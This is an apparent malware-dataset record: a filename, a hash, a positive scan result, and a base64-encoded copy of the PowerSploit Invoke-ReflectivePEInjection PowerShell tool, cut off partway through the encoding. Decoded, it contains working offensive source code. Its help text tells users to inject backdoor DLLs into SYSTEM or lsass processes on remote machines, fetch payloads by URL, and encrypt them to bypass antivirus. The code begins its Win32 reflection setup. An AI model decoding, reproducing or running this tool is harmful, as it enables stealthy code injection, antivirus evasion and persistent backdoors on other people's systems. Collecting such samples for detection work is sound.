Invoke-ReflectivePEInjection.ps1,c0be42397c451eeead60ee9dc31ba41e,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgp7CjwjCi5TWU5PUFNJUwoKVGhpcyBzY3JpcHQgaGFzIHR3byBtb2Rlcy4gSXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExML0VYRSBpbiB0byB0aGUgUG93ZXJTaGVsbCBwcm9jZXNzLCAKb3IgaXQgY2FuIHJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIGEgcmVtb3RlIHByb2Nlc3MuIFRoZXNlIG1vZGVzIGhhdmUgZGlmZmVyZW50IHBhcmFtZXRlcnMgYW5kIGNvbnN0cmFpbnRzLCAKcGxlYXNlIGxlYWQgdGhlIE5vdGVzIHNlY3Rpb24gKEdFTkVSQUwgTk9URVMpIGZvciBpbmZvcm1hdGlvbiBvbiBob3cgdG8gdXNlIHRoZW0uCgoKMS4pUmVmbGVjdGl2ZWx5IGxvYWRzIGEgRExMIG9yIEVYRSBpbiB0byBtZW1vcnkgb2YgdGhlIFBvd2Vyc2hlbGwgcHJvY2Vzcy4KQmVjYXVzZSB0aGUgRExML0VYRSBpcyBsb2FkZWQgcmVmbGVjdGl2ZWx5LCBpdCBpcyBub3QgZGlzcGxheWVkIHdoZW4gdG9vbHMgYXJlIHVzZWQgdG8gbGlzdCB0aGUgRExMcyBvZiBhIHJ1bm5pbmcgcHJvY2Vzcy4KClRoaXMgdG9vbCBjYW4gYmUgcnVuIG9uIHJlbW90ZSBzZXJ2ZXJzIGJ5IHN1cHBseWluZyBhIGxvY2FsIFdpbmRvd3MgUEUgZmlsZSAoRExML0VYRSkgdG8gbG9hZCBpbiB0byBtZW1vcnkgb24gdGhlIHJlbW90ZSBzeXN0ZW0sCnRoaXMgd2lsbCBsb2FkIGFuZCBleGVjdXRlIHRoZSBETEwvRVhFIGluIHRvIG1lbW9yeSB3aXRob3V0IHdyaXRpbmcgYW55IGZpbGVzIHRvIGRpc2suCgoKMi4pIFJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIG1lbW9yeSBvZiBhIHJlbW90ZSBwcm9jZXNzLgpBcyBtZW50aW9uZWQgYWJvdmUsIHRoZSBETEwgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCB3b24ndCBiZSBkaXNwbGF5ZWQgd2hlbiB0b29scyBhcmUgdXNlZCB0byBsaXN0IERMTHMgb2YgdGhlIHJ1bm5pbmcgcmVtb3RlIHByb2Nlc3MuCgpUaGlzIGlzIHByb2JhYmx5IG1vc3QgdXNlZnVsIGZvciBpbmplY3RpbmcgYmFja2Rvb3JzIGluIFNZU1RFTSBwcm9jZXNzZXMgaW4gU2Vzc2lvbjAuIEN1cnJlbnRseSwgeW91IGNhbm5vdCByZXRyaWV2ZSBvdXRwdXQKZnJvbSB0aGUgRExMLiBUaGUgc2NyaXB0IGRvZXNuJ3Qgd2FpdCBmb3IgdGhlIERMTCB0byBjb21wbGV0ZSBleGVjdXRpb24sIGFuZCBkb2Vzbid0IG1ha2UgYW55IGVmZm9ydCB0byBjbGVhbnVwIG1lbW9yeSBpbiB0aGUgCnJlbW90ZSBwcm9jZXNzLiAKCgpXaGlsZSB0aGlzIHNjcmlwdCBwcm92aWRlcyBmdW5jdGlvbmFsaXR5IHRvIHNwZWNpZnkgYSBmaWxlIHRvIGxvYWQgZnJvbSBkaXNrIGEgVVJMLCBvciBhIGJ5dGUgYXJyYXksIHRoZXNlIGFyZSBtb3JlIGZvciBkZW1vIHB1cnBvc2VzLiBUaGUgd2F5IEknZCByZWNvbW1lbmQgdXNpbmcgdGhlIHNjcmlwdCBpcyB0byBjcmVhdGUgYSBieXRlIGFycmF5CmNvbnRhaW5pbmcgdGhlIGZpbGUgeW91J2QgbGlrZSB0byByZWZsZWN0aXZlbHkgbG9hZCwgYW5kIGhhcmRjb2RlIHRoYXQgYnl0ZSBhcnJheSBpbiB0byB0aGUgc2NyaXB0LiBPbmUgYWR2YW50YWdlIG9mIGRvaW5nIHRoaXMgaXMgeW91IGNhbiBlbmNyeXB0IHRoZSBieXRlIGFycmF5IGFuZCBkZWNyeXB0IGl0IGluIG1lbW9yeSwgd2hpY2ggd2lsbApieXBhc3MgQS9WLiBBbm90aGVyIGFkdmFudGFnZSBpcyB5b3Ugd29uJ3QgYmUgbWFraW5nIHdlYiByZXF1ZXN0cy4gVGhlIHNjcmlwdCBjYW4gYWxzbyBsb2FkIGZpbGVzIGZyb20gU1FMIFNlcnZlciBhbmQgYmUgdXNlZCBhcyBhIFNRTCBTZXJ2ZXIgYmFja2Rvb3IuIFBsZWFzZSBzZWUgdGhlIENhc2FiYQpibG9nIGxpbmtlZCBiZWxvdyAodGhhbmtzIHRvIHdoaXRleSkuCgpQb3dlclNwbG9pdCBGdW5jdGlvbjogSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbgpBdXRob3I6IEpvZSBCaWFsZWssIFR3aXR0ZXI6IEBKb3NlcGhCaWFsZWsKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKVmVyc2lvbjogMS40CgouREVTQ1JJUFRJT04KClJlZmxlY3RpdmVseSBsb2FkcyBhIFdpbmRvd3MgUEUgZmlsZSAoRExML0VYRSkgaW4gdG8gdGhlIHBvd2Vyc2hlbGwgcHJvY2Vzcywgb3IgcmVmbGVjdGl2ZWx5IGluamVjdHMgYSBETEwgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KCi5QQVJBTUVURVIgUEVQYXRoCgpUaGUgcGF0aCBvZiB0aGUgRExML0VYRSB0byBsb2FkIGFuZCBleGVjdXRlLiBUaGlzIGZpbGUgbXVzdCBleGlzdCBvbiB0aGUgY29tcHV0ZXIgdGhlIHNjcmlwdCBpcyBiZWluZyBydW4gb24sIG5vdCB0aGUgcmVtb3RlIGNvbXB1dGVyLgoKLlBBUkFNRVRFUiBQRVVybAoKQSBVUkwgY29udGFpbmluZyBhIERMTC9FWEUgdG8gbG9hZCBhbmQgZXhlY3V0ZS4KCi5QQVJBTUVURVIgUEViYXNlNjQKCkEgYmFzZTY0IGVuY29kZWQgc3RyaW5nIG9mIERMTC9FWEUgdG8gbG9hZCBhbmQgZXhlY3V0ZS4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpPcHRpb25hbCwgYW4gYXJyYXkgb2YgY29tcHV0ZXJuYW1lcyB0byBydW4gdGhlIHNjcmlwdCBvbi4KCi5QQVJBTUVURVIgRnVuY1JldHVyblR5cGUKCk9wdGlvbmFsLCB0aGUgcmV0dXJuIHR5cGUgb2YgdGhlIGZ1bmN0aW9uIGJlaW5nIGNhbGxlZCBpbiB0aGUgRExMLiBEZWZhdWx0OiBWb2lkCiAgICBPcHRpb25zOiBTdHJpbmcsIFdTdHJpbmcsIFZvaWQuIFNlZSBub3RlcyBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KICAgIElNUE9SVEFOVDogRm9yIERMTHMgYmVpbmcgbG9hZGVkIHJlbW90ZWx5LCBvbmx5IFZvaWQgaXMgc3VwcG9ydGVkLgogICAgCi5QQVJBTUVURVIgRXhlQXJncwoKT3B0aW9uYWwsIGFyZ3VtZW50cyB0byBwYXNzIHRvIHRoZSBleGVjdXRhYmxlIGJlaW5nIHJlZmxlY3RpdmVseSBsb2FkZWQuCiAgICAKLlBBUkFNRVRFUiBQcm9jTmFtZQoKT3B0aW9uYWwsIHRoZSBuYW1lIG9mIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgdGhlIERMTCBpbiB0by4gSWYgbm90IGluamVjdGluZyBpbiB0byByZW1vdGUgcHJvY2VzcywgaWdub3JlIHRoaXMuCgouUEFSQU1FVEVSIFByb2NJZAoKT3B0aW9uYWwsIHRoZSBwcm9jZXNzIElEIG9mIHRoZSByZW1vdGUgcHJvY2VzcyB0byBpbmplY3QgdGhlIERMTCBpbiB0by4gSWYgbm90IGluamVjdGluZyBpbiB0byByZW1vdGUgcHJvY2VzcywgaWdub3JlIHRoaXMuCgouUEFSQU1FVEVSIEZvcmNlQVNMUgoKT3B0aW9uYWwsIHdpbGwgZm9yY2UgdGhlIHVzZSBvZiBBU0xSIG9uIHRoZSBQRSBiZWluZyBsb2FkZWQgZXZlbiBpZiB0aGUgUEUgaW5kaWNhdGVzIGl0IGRvZXNuJ3Qgc3VwcG9ydCBBU0xSLiBTb21lIFBFJ3Mgd2lsbCB3b3JrIHdpdGggQVNMUiBldmVuCiAgICBpZiB0aGUgY29tcGlsZXIgZmxhZ3MgZG9uJ3QgaW5kaWNhdGUgdGhleSBzdXBwb3J0IGl0LiBPdGhlciBQRSdzIHdpbGwgc2ltcGx5IGNyYXNoLiBNYWtlIHN1cmUgdG8gdGVzdCB0aGlzIHByaW9yIHRvIHVzaW5nLiBIYXMgbm8gZWZmZWN0IHdoZW4KICAgIGxvYWRpbmcgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KICAgIAouRVhBTVBMRQoKTG9hZCBEZW1vRExMIGZyb20gYSBVUkwgYW5kIHJ1biB0aGUgZXhwb3J0ZWQgZnVuY3Rpb24gV1N0cmluZ0Z1bmMgb24gdGhlIGN1cnJlbnQgc3lzdGVtLCBwcmludCB0aGUgd2NoYXJfdCogcmV0dXJuZWQgYnkgV1N0cmluZ0Z1bmMoKS4KTm90ZSB0aGF0IHRoZSBmaWxlIG5hbWUgb24gdGhlIHdlYnNpdGUgY2FuIGJlIGFueSBmaWxlIGV4dGVuc2lvbi4KSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVVcmwgaHR0cDovL3lvdXJzaXRlLmNvbS9EZW1vRExMLmRsbCAtRnVuY1JldHVyblR5cGUgV1N0cmluZwoKLkVYQU1QTEUKCkxvYWQgRGVtb0RMTCBhbmQgcnVuIHRoZSBleHBvcnRlZCBmdW5jdGlvbiBXU3RyaW5nRnVuYyBvbiBUYXJnZXQubG9jYWwsIHByaW50IHRoZSB3Y2hhcl90KiByZXR1cm5lZCBieSBXU3RyaW5nRnVuYygpLgpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRVBhdGggRGVtb0RMTC5kbGwgLUZ1bmNSZXR1cm5UeXBlIFdTdHJpbmcgLUNvbXB1dGVyTmFtZSBUYXJnZXQubG9jYWwKCi5FWEFNUExFCgpMb2FkIERlbW9ETEwgYW5kIHJ1biB0aGUgZXhwb3J0ZWQgZnVuY3Rpb24gV1N0cmluZ0Z1bmMgb24gYWxsIGNvbXB1dGVycyBpbiB0aGUgZmlsZSB0YXJnZXRsaXN0LnR4dC4gUHJpbnQKICAgIHRoZSB3Y2hhcl90KiByZXR1cm5lZCBieSBXU3RyaW5nRnVuYygpIGZyb20gYWxsIHRoZSBjb21wdXRlcnMuCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFUGF0aCBEZW1vRExMLmRsbCAtRnVuY1JldHVyblR5cGUgV1N0cmluZyAtQ29tcHV0ZXJOYW1lIChHZXQtQ29udGVudCB0YXJnZXRsaXN0LnR4dCkKCi5FWEFNUExFCgpMb2FkIERlbW9FWEUgYW5kIHJ1biBpdCBsb2NhbGx5LgpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRVBhdGggRGVtb0VYRS5leGUgLUV4ZUFyZ3MgIkFyZzEgQXJnMiBBcmczIEFyZzQiCgouRVhBTVBMRQoKTG9hZCBEZW1vRVhFIGFuZCBydW4gaXQgbG9jYWxseS4gRm9yY2VzIEFTTFIgb24gZm9yIHRoZSBFWEUuCkludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24gLVBFUGF0aCBEZW1vRVhFLmV4ZSAtRXhlQXJncyAiQXJnMSBBcmcyIEFyZzMgQXJnNCIgLUZvcmNlQVNMUgoKLkVYQU1QTEUKClJlZmVjdGl2ZWx5IGxvYWQgRGVtb0RMTF9SZW1vdGVQcm9jZXNzLmRsbCBpbiB0byB0aGUgbHNhc3MgcHJvY2VzcyBvbiBhIHJlbW90ZSBjb21wdXRlci4KSW52b2tlLVJlZmxlY3RpdmVQRUluamVjdGlvbiAtUEVQYXRoIERlbW9ETExfUmVtb3RlUHJvY2Vzcy5kbGwgLVByb2NOYW1lIGxzYXNzIC1Db21wdXRlck5hbWUgVGFyZ2V0LkxvY2FsCgouRVhBTVBMRQoKTG9hZCBhIFBFIGZyb20gYSBieXRlIGFycmF5LgpJbnZva2UtUmVmbGVjdGl2ZVBFSW5qZWN0aW9uIC1QRVBhdGggKEdldC1Db250ZW50IGM6XERlbW9FWEUuZXhlIC1FbmNvZGluZyBCeXRlKSAtRXhlQXJncyAiQXJnMSBBcmcyIEFyZzMgQXJnNCIKCi5OT1RFUwpHRU5FUkFMIE5PVEVTOgpUaGUgc2NyaXB0IGhhcyAzIGJhc2ljIHNldHMgb2YgZnVuY3Rpb25hbGl0eToKMS4pIFJlZmxlY3RpdmVseSBsb2FkIGEgRExMIGluIHRvIHRoZSBQb3dlclNoZWxsIHByb2Nlc3MKICAgIC1DYW4gcmV0dXJuIERMTCBvdXRwdXQgdG8gdXNlciB3aGVuIHJ1biByZW1vdGVseSBvciBsb2NhbGx5LgogICAgLUNsZWFucyB1cCBtZW1vcnkgaW4gdGhlIFBTIHByb2Nlc3Mgb25jZSB0aGUgRExMIGZpbmlzaGVzIGV4ZWN1dGluZy4KICAgIC1HcmVhdCBmb3IgcnVubmluZyBwZW50ZXN0IHRvb2xzIG9uIHJlbW90ZSBjb21wdXRlcnMgd2l0aG91dCB0cmlnZ2VyaW5nIHByb2Nlc3MgbW9uaXRvcmluZyBhbGVydHMuCiAgICAtQnkgZGVmYXVsdCwgdGFrZXMgMyBmdW5jdGlvbiBuYW1lcywgc2VlIGJlbG93IChETEwgTE9BRElORyBOT1RFUykgZm9yIG1vcmUgaW5mby4KMi4pIFJlZmxlY3RpdmVseSBsb2FkIGFuIEVYRSBpbiB0byB0aGUgUG93ZXJTaGVsbCBwcm9jZXNzLgogICAgLUNhbiBOT1QgcmV0dXJuIEVYRSBvdXRwdXQgdG8gdXNlciB3aGVuIHJ1biByZW1vdGVseS4gSWYgcmVtb3RlIG91dHB1dCBpcyBuZWVkZWQsIHlvdSBtdXN0IHVzZSBhIERMTC4gQ0FOIHJldHVybiBFWEUgb3V0cHV0IGlmIHJ1biBsb2NhbGx5LgogICAgLUNsZWFucyB1cCBtZW1vcnkgaW4gdGhlIFBTIHByb2Nlc3Mgb25jZSB0aGUgRExMIGZpbmlzaGVzIGV4ZWN1dGluZy4KICAgIC1HcmVhdCBmb3IgcnVubmluZyBleGlzdGluZyBwZW50ZXN0IHRvb2xzIHdoaWNoIGFyZSBFWEUncyB3aXRob3V0IHRyaWdnZXJpbmcgcHJvY2VzcyBtb25pdG9yaW5nIGFsZXJ0cy4KMy4pIFJlZmxlY3RpdmVseSBpbmplY3QgYSBETEwgaW4gdG8gYSByZW1vdGUgcHJvY2Vzcy4KICAgIC1DYW4gTk9UIHJldHVybiBETEwgb3V0cHV0IHRvIHRoZSB1c2VyIHdoZW4gcnVuIHJlbW90ZWx5IE9SIGxvY2FsbHkuCiAgICAtRG9lcyBOT1QgY2xlYW4gdXAgbWVtb3J5IGluIHRoZSByZW1vdGUgcHJvY2VzcyBpZi93aGVuIERMTCBmaW5pc2hlcyBleGVjdXRpb24uCiAgICAtR3JlYXQgZm9yIHBsYW50aW5nIGJhY2tkb29yIG9uIGEgc3lzdGVtIGJ5IGluamVjdGluZyBiYWNrZG9vciBETEwgaW4gdG8gYW5vdGhlciBwcm9jZXNzZXMgbWVtb3J5LgogICAgLUV4cGVjdHMgdGhlIERMTCB0byBoYXZlIHRoaXMgZnVuY3Rpb246IHZvaWQgVm9pZEZ1bmMoKS4gVGhpcyBpcyB0aGUgZnVuY3Rpb24gdGhhdCB3aWxsIGJlIGNhbGxlZCBhZnRlciB0aGUgRExMIGlzIGxvYWRlZC4KCgoKRExMIExPQURJTkcgTk9URVM6CgpQb3dlclNoZWxsIGRvZXMgbm90IGNhcHR1cmUgYW4gYXBwbGljYXRpb25zIG91dHB1dCBpZiBpdCBpcyBvdXRwdXQgdXNpbmcgc3Rkb3V0LCB3aGljaCBpcyBob3cgV2luZG93cyBjb25zb2xlIGFwcHMgb3V0cHV0LgpJZiB5b3UgbmVlZCB0byBnZXQgYmFjayB0aGUgb3V0cHV0IGZyb20gdGhlIFBFIGZpbGUgeW91IGFyZSBsb2FkaW5nIG9uIHJlbW90ZSBjb21wdXRlcnMsIHlvdSBtdXN0IGNvbXBpbGUgdGhlIFBFIGZpbGUgYXMgYSBETEwsIGFuZCBoYXZlIHRoZSBETEwKcmV0dXJuIGEgY2hhciogb3Igd2NoYXJfdCosIHdoaWNoIFBvd2VyU2hlbGwgY2FuIHRha2UgYW5kIHJlYWQgdGhlIG91dHB1dCBmcm9tLiBBbnl0aGluZyBvdXRwdXQgZnJvbSBzdGRvdXQgd2hpY2ggaXMgcnVuIHVzaW5nIHBvd2Vyc2hlbGwKcmVtb3Rpbmcgd2lsbCBub3QgYmUgcmV0dXJuZWQgdG8geW91LiBJZiB5b3UganVzdCBydW4gdGhlIFBvd2VyU2hlbGwgc2NyaXB0IGxvY2FsbHksIHlvdSBXSUxMIGJlIGFibGUgdG8gc2VlIHRoZSBzdGRvdXQgb3V0cHV0IGZyb20KYXBwbGljYXRpb25zIGJlY2F1c2UgaXQgd2lsbCBqdXN0IGFwcGVhciBpbiB0aGUgY29uc29sZSB3aW5kb3cuIFRoZSBsaW1pdGF0aW9uIG9ubHkgYXBwbGllcyB3aGVuIHVzaW5nIFBvd2VyU2hlbGwgcmVtb3RpbmcuCgpGb3IgRExMIExvYWRpbmc6Ck9uY2UgdGhpcyBzY3JpcHQgbG9hZHMgdGhlIERMTCwgaXQgY2FsbHMgYSBmdW5jdGlvbiBpbiB0aGUgRExMLiBUaGVyZSBpcyBhIHNlY3Rpb24gbmVhciB0aGUgYm90dG9tIGxhYmVsZWQgIllPVVIgQ09ERSBHT0VTIEhFUkUiCkkgcmVjb21tZW5kIHlvdXIgRExMIHRha2Ugbm8gcGFyYW1ldGVycy4gSSBoYXZlIHByZXdyaXR0ZW4gY29kZSB0byBoYW5kbGUgZnVuY3Rpb25zIHdoaWNoIHRha2Ugbm8gcGFyYW1ldGVycyBhcmUgcmV0dXJuCnRoZSBmb2xsb3dpbmcgdHlwZXM6IGNoYXIqLCB3Y2hhcl90KiwgYW5kIHZvaWQuIElmIHRoZSBmdW5jdGlvbiByZXR1cm5zIGNoYXIqIG9yIHdjaGFyX3QqIHRoZSBzY3JpcHQgd2lsbCBvdXRwdXQgdGhlCnJldHVybmVkIGRhdGEuIFRoZSBGdW5jUmV0dXJuVHlwZSBwYXJhbWV0ZXIgY2FuIGJlIHVzZWQgdG8gc3BlY2lmeSB3aGljaCByZXR1cm4gdHlwZSB0byB1c2UuIFRoZSBtYXBwaW5nIGlzIGFzIGZvbGxvd3M6CndjaGFyX3QqICAgOiBGdW5jUmV0dXJuVHlwZSA9IFdTdHJpbmcKY2hhciogICAgICA6IEZ1bmNSZXR1cm5UeXBlID0gU3RyaW5nCnZvaWQgICAgICAgOiBEZWZhdWx0LCBkb24ndCBzdXBwbHkgYSBGdW5jUmV0dXJuVHlwZQoKRm9yIHRoZSB3aGNhcl90KiBhbmQgY2hhcl90KiBvcHRpb25zIHRvIHdvcmssIHlvdSBtdXN0IGFsbG9jYXRlIHRoZSBzdHJpbmcgdG8gdGhlIGhlYXAuIERvbid0IHNpbXBseSBjb252ZXJ0IGEgc3RyaW5nCnVzaW5nIHN0cmluZy5jX3N0cigpIGJlY2F1c2UgaXQgd2lsbCBiZSBhbGxvY2FlZCBvbiB0aGUgc3RhY2sgYW5kIGJlIGRlc3Ryb3llZCB3aGVuIHRoZSBETEwgcmV0dXJucy4KClRoZSBmdW5jdGlvbiBuYW1lIGV4cGVjdGVkIGluIHRoZSBETEwgZm9yIHRoZSBwcmV3cml0dGVuIEZ1bmNSZXR1cm5UeXBlJ3MgaXMgYXMgZm9sbG93czoKV1N0cmluZyAgICA6IFdTdHJpbmdGdW5jClN0cmluZyAgICAgOiBTdHJpbmdGdW5jClZvaWQgICAgICAgOiBWb2lkRnVuYwoKVGhlc2UgZnVuY3Rpb24gbmFtZXMgQVJFIGNhc2Ugc2Vuc2l0aXZlLiBUbyBjcmVhdGUgYW4gZXhwb3J0ZWQgRExMIGZ1bmN0aW9uIGZvciB0aGUgd3N0cmluZyB0eXBlLCB0aGUgZnVuY3Rpb24gd291bGQKYmUgZGVjbGFyZWQgYXMgZm9sbG93czoKZXh0ZXJuICJDIiBfX2RlY2xzcGVjKCBkbGxleHBvcnQgKSB3Y2hhcl90KiBXU3RyaW5nRnVuYygpCgoKSWYgeW91IHdhbnQgdG8gdXNlIGEgRExMIHdoaWNoIHJldHVybnMgYSBkaWZmZXJlbnQgZGF0YSB0eXBlLCBvciB3aGljaCB0YWtlcyBwYXJhbWV0ZXJzLCB5b3Ugd2lsbCBuZWVkIHRvIG1vZGlmeQp0aGlzIHNjcmlwdCB0byBhY2NvbW9kYXRlIHRoaXMuIFlvdSBjYW4gZmluZCB0aGUgY29kZSB0byBtb2RpZnkgaW4gdGhlIHNlY3Rpb24gbGFiZWxlZCAiWU9VUiBDT0RFIEdPRVMgSEVSRSIuCgpGaW5kIGEgRGVtb0RMTCBhdDogaHR0cHM6Ly9naXRodWIuY29tL2NseW1iM3IvUG93ZXJTaGVsbC90cmVlL21hc3Rlci9JbnZva2UtUmVmbGVjdGl2ZURsbEluamVjdGlvbgoKLkxJTksKCkJsb2c6IGh0dHA6Ly9jbHltYjNyLndvcmRwcmVzcy5jb20vCkdpdGh1YiByZXBvOiBodHRwczovL2dpdGh1Yi5jb20vY2x5bWIzci9Qb3dlclNoZWxsL3RyZWUvbWFzdGVyL0ludm9rZS1SZWZsZWN0aXZlUEVJbmplY3Rpb24KCkJsb2cgb24gcmVmbGVjdGl2ZSBsb2FkaW5nOiBodHRwOi8vY2x5bWIzci53b3JkcHJlc3MuY29tLzIwMTMvMDQvMDYvcmVmbGVjdGl2ZS1kbGwtaW5qZWN0aW9uLXdpdGgtcG93ZXJzaGVsbC8KQmxvZyBvbiBtb2RpZnlpbmcgbWltaWthdHogZm9yIHJlZmxlY3RpdmUgbG9hZGluZzogaHR0cDovL2NseW1iM3Iud29yZHByZXNzLmNvbS8yMDEzLzA0LzA5L21vZGlmeWluZy1taW1pa2F0ei10by1iZS1sb2FkZWQtdXNpbmctaW52b2tlLXJlZmxlY3RpdmVkbGxpbmplY3Rpb24tcHMxLwpCbG9nIG9uIHVzaW5nIHRoaXMgc2NyaXB0IGFzIGEgYmFja2Rvb3Igd2l0aCBTUUwgc2VydmVyOiBodHRwOi8vd3d3LmNhc2FiYS5jb20vYmxvZy8KCiM+CgpbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0iV2ViRmlsZSIpXQpQYXJhbSgKICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJMb2NhbEZpbGUiLCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtTdHJpbmddCiAgICAkUEVQYXRoLAogICAgCiAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiV2ViRmlsZSIsIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgW1VyaV0KICAgICRQRVVybCwKCiAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiQnl0ZXMiLCBQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICBbU3RyaW5nXQogICAgJFBFYmFzZTY0LAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSldCiAgICBbU3RyaW5nW11dCiAgICAkQ29tcHV0ZXJOYW1lLAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMildCiAgICBbVmFsaWRhdGVTZXQoICdXU3RyaW5nJywgJ1N0cmluZycsICdWb2lkJyApXQogICAgW1N0cmluZ10KICAgICRGdW5jUmV0dXJuVHlwZSA9ICdWb2lkJywKICAgIAogICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMpXQogICAgW1N0cmluZ10KICAgICRFeGVBcmdzLAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCldCiAgICBbSW50MzJdCiAgICAkUHJvY0lkLAogICAgCiAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSldCiAgICBbU3RyaW5nXQogICAgJFByb2NOYW1lLAoKICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA2KV0KICAgIFtTd2l0Y2hdCiAgICAkRm9yY2VBU0xSCikKClNldC1TdHJpY3RNb2RlIC1WZXJzaW9uIDIKCgokUmVtb3RlU2NyaXB0QmxvY2sgPSB7CiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbQnl0ZVtdXQogICAgICAgICRQRUJ5dGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVuY1JldHVyblR5cGUsCiAgICAgICAgICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQzMl0KICAgICAgICAkUHJvY0lkLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkUHJvY05hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0Jvb2xdCiAgICAgICAgJEZvcmNlQVNMUgogICAgKQogICAgCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwogICAgIyMjIyMjIyMjIyAgV2luMzIgU3R1ZmYgICMjIyMjIyMjIyMKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICBGdW5jdGlvbiBHZXQtV2luMzJUeXBlcwogICAgewogICAgICAgICRXaW4zMlR5cGVzID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CgogICAgICAgICNEZWZpbmUgYWxsIHRoZSBzdHJ1Y3R1cmVzL2VudW1zIHRoYXQgd2lsbCBiZSB1c2VkCiAgICAgICAgIyAgIFRoaXMgYXJ0aWNsZSBzaG93cyB5b3UgaG93IHRvIGRvIHRoaXMgd2l0aCByZWZsZWN0aW9uOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8yMDEyLzA3L3N0cnVjdHMtYW5kLWVudW1zLXVzaW5nLXJlZmxlY3Rpb24uaHRtbAogICAgICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgogICAgICAgICREeW5hbWljQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnRHluYW1pY0Fzc2VtYmx5JykKICAgICAgICAkQXNzZW1ibHlCdWlsZGVyID0gJERvbWFpbi5EZWZpbmVEeW5hbWljQXNzZW1ibHkoJER5bmFtaWNBc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQogICAgICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdEeW5hbWljTW9kdWxlJywgJGZhbHNlKQogICAgICAgICRDb25zdHJ1Y3RvckluZm8gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF0KCgogICAgICAgICMjIyMjIyMjIyMjIyAgICBFTlVNICAgICMjIyMjIyMjIyMjIwogICAgICAgICNFbnVtIE1hY2hpbmVUeXBlCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnTWFjaGluZVR5cGUnLCAnUHVibGljJywgW1VJbnQxNl0pCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ05hdGl2ZScsIFtVSW50MTZdIDApIHwgT3V0LU51bGwKICAgICAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnSTM4NicsIFtVSW50MTZdIDB4MDE0YykgfCBPdXQtTnVsbAogICAgICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdJdGFuaXVtJywgW1VJbnQxNl0gMHgwMjAwKSB8IE91dC1OdWxsCiAgICAgICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ3g2NCcsIFtVSW50MTZdIDB4O